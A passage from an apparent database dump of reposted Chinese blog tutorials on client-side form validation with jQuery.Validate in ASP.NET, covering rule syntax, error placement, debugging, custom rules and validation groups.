/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; range: [1,99]<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtEmail.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; email: true<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; messages:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtPwd.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required:&quot;不输入用户名你怎么登陆?&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtPwd.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; required:&quot;你不输入密码怎么行呢?&quot;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; minlength:&quot;密码太短啦至少6位&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;%=txtAge.UniqueID %&gt;:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; range:&quot;您的年龄有问题把,得在1-99岁之间哦&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>这种方式虽然可以使用所有的高级功能，验证规则也分离出来了，但是就是书 写起来不简便，所以我的个人建议是如果不是要求很高的情况下，可以将如required，number，email等常规的简单的验证规则使用第1种验证 方式，方便、快捷，只有当第1种无法实行的时候才使用这种方式，如equalTo（比较验证），remote（AJAX验证）等，这样相互结合效率是最高 的。</p>\r\n\r\n<p>到这边可能会有人奇怪了，因为在上面介绍这种JS验证方式的的时候有个小例子，需要把规则放入jQuery.Validate的方法中，否则制定的验证规则是无效的。</p>\r\n\r\n<p>这里我就要说明下了，因为，这个例子中我使用的模拟一个项目的形式编写的，页面全部套用母版页，所以为了满足jQuery.Validate拦截 form表单的方式，所以我在母版页中的&lt;header&gt;定义了一个变量用来存放每个页面中定义的验证规则：var opts = null;，这样根据HTML从上到下的解析方式首先opts被定义，然后在每个子页面被赋值，最后再返回母版页中的jQuery.Validate初始 拦截form方法：</p>\r\n\r\n<p>jQuery(document).ready(function() {<br />\r\n&nbsp;&nbsp;&nbsp; if (opts != undefined || opts != null) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientID %&gt;&quot;).validate(opts);<br />\r\n&nbsp;&nbsp;&nbsp; } else {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery(&quot;#&lt;%=form1.ClientID %&gt;&quot;).validate();<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n});</p>\r\n\r\n<p>如果在子页面里制定了规则，则按规则验证，没有规则则直接验证（这边的opts中包含的规则和具体的class规则不会有冲突，你可以将一部分规则写在opts中（remote，equalTo），另外的规则写在class中（required，number等）</p>\r\n\r\n<p>以上就是使用jQuery.Validate进行客户端验证中级篇-上，具体的代码请下载源代码进行查看。</p>\r\n\r\n<p>PS：1、本来想把中篇写成一篇的，但是写着写着发现东西实在太多，写在1篇里会太多，所以分成了2篇写，请见谅！</p>\r\n\r\n<p>2、下一篇将对jQuery.Validate的使用过程中会碰到的问题进行介绍，如第2种验证方式更改验证规则所处的属性、指定验证信息显示位置等。</p>\r\n\r\n<p>转自:http://www.cnblogs.com/kyo-yo/archive/2010/06/29/Use-jQueryValidate-To-Being-Client-Validation.html</p>\r\n',0,1437805135,0,0),(50,33,'使用jQuery.Validate进行客户端验证（中级篇-下）——不使用微软验证控件的理由','<p>在上一篇文章使用jQuery.Validate进行客户端验证（中级篇-上）中我介绍了jQuery.Validate的3种验证方式，今天这篇中级-下则是在上一篇的基础上继续介绍jQuery.Validate的一些常用的验证使用方法。</p>\r\n\r\n<p>今天主要以使用jQuery.Validate后会遇到的问题为介绍内容，主要介绍以下几点：</p>\r\n\r\n<p>1、在使用上一篇中第2种方式，以JSON的格式编写验证规则，影响了正常的class使用，如何处理？</p>\r\n\r\n<p>2、在ASP.NET下，所有的按钮都会提交form表单，所以都会引发验证，如何处理？</p>\r\n\r\n<p>3、我希望验证的提示信息可以在统一的地方显示，如何处理？</p>\r\n\r\n<p>4、我在开发的过程中，我不确定所编写的规则是否正确，如何进行调试？</p>\r\n\r\n<p>5、我使用的是微软AJAX控件，想监控dropdownlist是否选择，为何不起作用?</p>\r\n\r\n<p>6、radiobox，checkbox，listbox如何进行高级应用？如何指定选择数量？</p>\r\n\r\n<p>来看下第1点：在使用上一篇中第2种方式，以JSON的格式编写验证规则，影响了正常的class使用，如何处理？（具体见Middle-4.aspx）</p>\r\n\r\n<p>首先看下使用第2种方式是如何编写验证规则的：</p>\r\n\r\n<p>&lt;asp:TextBox ID=&quot;txtPwd&quot; TextMode=&quot;Password&quot; runat=&quot;server&quot; CssClass=&quot;{required:true,minlength:6,messages:{required:&#39;你不输入密码怎么行 呢?&#39;,minlength:&#39;密码太短啦至少6位&#39;}}&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>可以看到这样写验证规则虽然简单，但是如果我要为这个控件应用其他样式怎么办？所以现在就是处理这个问题的时候了，在页面的头部加上一句代码：</p>\r\n\r\n<p>jQuery.metadata.setType(&quot;attr&quot;, &quot;validate&quot;);</p>\r\n\r\n<p>由于这种验证规则方式需要依赖jQuery.metadata才可以正常运作，所以我们需要在jQuery.metadata上做文章，分析下jQuery.metadata的代码，可以看到，默认情况下它是检测控件的class属性：</p>\r\n\r\n<p>defaults : {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; type: &#39;class&#39;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name: &#39;metadata&#39;,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cre: /({.*})/,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; single: &#39;metadata&#39;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>那我们可不可以更改这个属性呢？肯定是可以的，就是在页面上加上那句代码，更改其检测的属性。</p>\r\n\r\n<p>接着我们还需要修改下页面中的代码，将原来所有的&quot;CssClass&rdquo;改为我们更改的检测属性&quot;validate&rdquo;、</p>\r\n\r\n<p>这样就很好的更改了验证规则所存放的属性了。</p>\r\n\r\n<p>第2点：在ASP.NET下，所有的按钮都会提交form表单，所以都会引发验证，如何处理？（具体见Middle-4.aspx中btnNoValidate按钮）</p>\r\n\r\n<p>在实际的开发当中，一个页面上总会有N个按钮，由于ASP.NET的机制特性，所有的控件都会回发页面，也就提交了表单，但是此时整个表单都被 jQuery.Validate所监控，所以只要页面中有某个地方不符合验证规则，任何回发页面的操作都会被拦截住，但是实际上我们需要引发验证的按钮只 有1或者2个，而其他按钮不需要，这时我们就要想办法了。</p>\r\n\r\n<p>其实很简单，就是为不需要引发验证的控件加个样式&quot;cancel&quot;即可，代码如下：</p>\r\n\r\n<p>&lt;asp:Button ID=&quot;btnNoValidate&quot; runat=&quot;server&quot; Text=&quot;点我不会引发验证哦&quot; CssClass=&quot;cancel&quot; /&gt;</p>\r\n\r\n<p>怎么样很简单吧？</p>\r\n\r\n<p>第3点：我希望验证的提示信息可以在统一的地方显示，如何处理？（具体见Middle-5.aspx）</p>\r\n\r\n<p>在开发的过程当中，会有一些特殊的需求，就比如页面上使用了tab页面，而提交按钮就一个，这时就需要将验证提示信息统一放在一个位置，好方便查看，如图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725142526327581.jpg\" style=\"height:255px; width:586px\" /></p>\r\n\r\n<p>要实现这个效果只需在JS编写验证规则时添加：</p>\r\n\r\n<p>errorPlacement: function(error, element) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; error.html(error.html()+&quot;&lt;br/&gt;&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; error.appendTo(&quot;#errorContainer&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>error是一个label对象里面包含了错误消息，element则是验证未通过的对象元素，通过errorPlacement可以方便的将验证提示信息统一放入一个位置。</p>\r\n\r\n<p>第4点：我在开发的过程中，我不确定所编写的规则是否正确，如何进行调试？（具体见Middle-5.aspx）</p>\r\n\r\n<p>这个就比较简单了，jQuery.Validate默认已经为我们考虑过了，只需在JS编写规则时添加一个属性：</p>\r\n\r\n<p>debug:true</p>\r\n\r\n<p>这样就表示现在在调试，这时不会提交表单。</p>\r\n\r\n<p>第5点：我使用的是微软AJAX控件，想监控dropdownlist是否选择，为何不起作用?（具体见Middle-5.aspx中的性别）</p>\r\n\r\n<p>在使用微软AJAX控件中的dropdownlist级联时，比如省市区联动，如果省没有选择，则市和区都是灰的，是disabled状态，是被禁用的，类似代码如下：</p>\r\n\r\n<p>&lt;asp:DropDownList ID=&quot;DropDownList1&quot; runat=&quot;server&quot; CssClass=&quot;required&quot; disabled=&quot;true&quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;asp:ListItem&gt;&lt;/asp:ListItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;asp:ListItem Value=&quot;1&quot;&gt;男&lt;/asp:ListItem&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;asp:ListItem Value=&quot;0&quot;&gt;女&lt;/asp:ListItem&gt;<br />\r\n&lt;/asp:DropDownList&gt;</p>\r\n\r\n<p>我这边是强制把这个DropDownList禁用了，这时如果为这个控件加上&ldquo;required&rdquo;将不会有任何反应，因为在jQuery.Validate代码中默认是不验证的，具体代码见jQuery.Validate.js414行：</p>\r\n\r\n<p>not(&quot;:submit, :reset, :image, [disabled]&quot;)</p>\r\n\r\n<p>所以为了方便我们使用，我们修改下代码，将[disabled]&quot;去除，改为：</p>\r\n\r\n<p>not(&quot;:submit, :reset, :image&quot;)</p>\r\n\r\n<p>这样再刷新下页面，验证就起作用了。</p>\r\n\r\n<p>第6点：radiobox，checkbox，listbox如何进行高级应用？如何指定选择数量？（具体请见radio-checkbox-select-demo.html）</p>\r\n\r\n<p>这点我直接引用了官方关于radiobox，checkbox，listbox应用的例子，因为官方的例子已经写的非常好了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>以上就是使用jQuery.Validate进行客户端验证中级篇-下，本文就jQuery.Validate在使用上遇到的问题进行了介绍（都是 我在实际项目中碰到的，进行一个总结，难免有遗漏，如果有过jQuery.Validate开发经验的朋友欢迎指点），具体可以下载源代码查看。</p>\r\n\r\n<p>PS：中级篇总算写完了，下面就是高级篇的应用了，高级篇主要会讲：如何扩展验证方式，分组验证，AJAX验证，敬请期待！</p>\r\n\r\n<p>转自:http://www.cnblogs.com/kyo-yo/archive/2010/07/01/Use-jQuery-Validate-To-Being-Client-Validate-Middle-2.html</p>\r\n',0,1437805560,0,0),(51,33,'使用jQuery.Validate进行客户端验证（高级篇-上）——不使用微软验证控件的理由','<p>在上一篇使用jQuery.Validate进行客户端验证（中级篇-下）中我介绍了jQuery.Validate在日常使用的过程中会遇到哪些问题及解决办法，今天的高级篇则主要是对jQuery.Validate的一些高级应用进行介绍。</p>\r\n\r\n<p>本篇主要介绍为以下2点：</p>\r\n\r\n<p>1、扩展验证规则，jQuery.Validate只提供了一些基本的验证功能，并不能满足我们日常开发的需求，所以我们要为jQuery.Validate扩展验证规则。</p>\r\n\r\n<p>2、分组验证，在开发的时候有时会遇到的一个问题就是，不同按钮引发不同的验证。</p>\r\n\r\n<p>首先来介绍下第一点：扩展验证规则，在jQuery.Validate默认的验证规则无法满足我们的日常开发需求的时候，我们需要根据自己的业务需求指定一些相应的规则。（具体见MasterPage.master）</p>\r\n\r\n<p>为了扩展验证规则，我们首先要看下jQuery.Validate为我们提供的扩展方法：</p>\r\n\r\n<p>addMethod: function(name, method, message) {<br />\r\n&nbsp;&nbsp;&nbsp; $.validator.methods[name] = method;<br />\r\n&nbsp;&nbsp;&nbsp; $.validator.messages[name] = message;<br />\r\n&nbsp;&nbsp;&nbsp; if (method.length &lt; 3) {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.validator.addClassRules(name, $.validator.normalizeRule(name));<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n},</p>\r\n\r\n<p>这段代码就是用来扩展验证规则的，意思很简单，就是向jQuery.Validate添加验证方法。</p>\r\n\r\n<p>接收3个参数：name-验证规则名</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method-验证规则实现函数（function）</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; message-验证不通过显示的错误消息</p>\r\n\r\n<p>当我们调用了这个方法后，我们所写的规则自动就会加入到jQuery.Validate规则中。</p>\r\n\r\n<p>好了，我们看下具体如何实现：</p>\r\n\r\n<p>手机号码验证：</p>\r\n\r\n<p>jQuery.validator.addMethod(&quot;telphoneValid&quot;, function(value, element) {<br />\r\n&nbsp;&nbsp;&nbsp; var tel = /^(130|131|132|133|134|135|136|137|138|139|150|153|157|158|159|180|187|188|189)\\d{8}$/;<br />\r\n&nbsp;&nbsp;&nbsp; return tel.test(value) || this.optional(element);<br />\r\n}, &quot;请输入正确的手机号码&quot;);</p>\r\n\r\n<p>这边的method需要注意的是，这个method实现函数接收2个元素：</p>\r\n\r\n<p>value：检测的对象的值</p>\r\n\r\n<p>element：检测的对象</p>\r\n\r\n<p>这边我定义了一个名为&ldquo;telphoneValid&rdquo;的验证规则，在验证规则里我首先定义了个手机验证的正则表达式，然后将值放入正则表达式进行验证，返回验证结果，返回的错误消息是&ldquo;请输入正确的手机号码&rdquo;。</p>\r\n\r\n<p>这样就完成了一个简单的手机号码验证规则扩展。</p>\r\n\r\n<p>其实这边也可以把扩展规则放到一个当单独的JS中方便以后重用，但因为这边仅仅是演示，我就把扩展方法放到母版页中了。</p>\r\n\r\n<p>注意：我这边的扩展方法是放在jQuery(document).ready()中的，这样可以保证每次页面加载完毕后的时候，自定义的验证规则可以被加载进jQuery.Validate中。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>接下来说下第2点：分组验证，这个分组验证在默认的jQuery.Validate中默认是不支持的，也是我觉得很不爽的，因为在实际的开发过程中经常会碰到需要分组验证的时候。</p>\r\n\r\n<p>这点微软的验证控件就做的很好，在微软的控件里，默认都有ValidationGroup这个属性，只要把属性名设置为相同就可以进行分组验证了，但是jQuery.Validate自身却没提供这个功能，所以我们只能自己扩展了。</p>\r\n\r\n<p>来一下具体的场景，在一个页面里有2个tab页面，不同tab页面需要不同的提交按钮：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725142756800021.jpg\" style=\"height:184px; width:603px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150725142811390121.jpg\" style=\"height:200px; width:608px\" /></p>\r\n\r\n<p>这2个就是标准的分组验证情况，如果不设置分组验证的情况下，点击[基本信息提交]和[描述提交]按钮后页面上所有的验证都会被相应，这是因为2个 按钮都在一个form表单中，2个按钮的点击事件默认都是在客户端提交表单，然后由服务器端来分配执行代码，所以问题就出现了。</p>\r\n\r\n<p>这时我们就需要引入分组验证了，这个解决思路是我在一个国外的网站找到的，不过具体地址我找不到了，这个方法有个弊端就是必须是将需要分组的控件必须放入不同的容器中，如div,table等，因为采用的是标识class样式来进行分组验证。</p>\r\n\r\n<p>看下具体代码：</p>\r\n\r\n<p>//初始化分组验证</p>\r\n\r\n<p>function InitValidationGroup() {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; $(&#39;.validationGroup .causesValidation&#39;).click(Validate);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; $(&#39;.validationGroup :text&#39;).keydown(function(evt) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (evt.keyCode == 13) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var $nextInput = $(this).nextAll(&#39;:input:first&#39;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($nextInput.is(&#39;:submit&#39;)) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Validate(evt);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evt.preventDefault();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $nextInput.focus();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; });</p>\r\n\r\n<p>}</p>\r\n\r\n<p>function Validate(evt) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var $group = $(this).parents(&#39;.validationGroup&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var isValid = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; $group.find(&#39;:input&#39;).each(function(i, item) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$(item).valid())</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isValid = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; });</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (!isValid)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evt.preventDefault();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>上面的代码就是用来进行分组验证的初始化的，这段代码会找寻页面中标有validationGroup样式的元素（分组的容器），然后在这个元素中找带causesValidation样式的元素（这个元素是引发验证的按钮），</p>\r\n\r\n<p>上面代码实现分组验证的逻辑就是当带causesValidation样式的元素引发验证后会找寻这个元素的父级validationGroup元素，然后遍历validationGroup元素下的所有有验证规则的元素判断是否验证通过。</p>\r\n\r\n<p>页面代码:</p>\r\n\r\n<p>&lt;div id=&quot;tabs&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;ul&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;li&gt;&lt;a href=&quot;#baseinfo&quot;&gt;基本信息&lt;/a&gt;&lt;/li&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;li&gt;&lt;a href=&quot;#personaldesc&quot;&gt;个人描述&lt;/a&gt;&lt;/li&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;/ul&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;div id=&quot;baseinfo&quot; class=&quot;validationGroup&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;table cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; border=&quot;1&quot; width=&quot;50%&quot; align=&quot;center&quot;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用户名</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtUid&quot; runat=&quot;server&quot;&gt;&lt;/asp:TextBox&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 密码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;asp:TextBox ID=&quot;txtPwd&quot; ValidationGroup=&quot;&quot; TextMode=&quot;Password&quot; runat=&quot;server&quot;&gt;&lt;/asp:Text</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 